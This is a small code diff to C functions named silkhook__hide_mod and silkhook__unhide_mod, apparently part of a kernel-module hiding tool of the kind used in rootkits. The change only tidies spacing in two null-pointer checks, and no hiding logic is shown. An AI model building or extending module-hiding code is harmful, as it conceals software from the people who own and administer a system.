@@ -26,7 +26,7 @@
 
 int silkhook__hide_mod(struct module *mod, struct silkhook_hidden_mod *state)
 {
-	if (!mod || ! state)
+	if (!mod || !state)
 		return SILKHOOK_ERR_INVAL;
 
 	if (state->hidden)
@@ -47,7 +47,7 @@ int silkhook__hide_mod(struct module *mod, struct silkhook_hidden_mod *state)
 
 int silkhook__unhide_mod(struct silkhook_hidden_mod *state)
 {
-	if (!state || ! state->mod)
+	if (!state || !state->mod)
 		return SILKHOOK_ERR_INVAL;
 
 	if (!state->hidden)
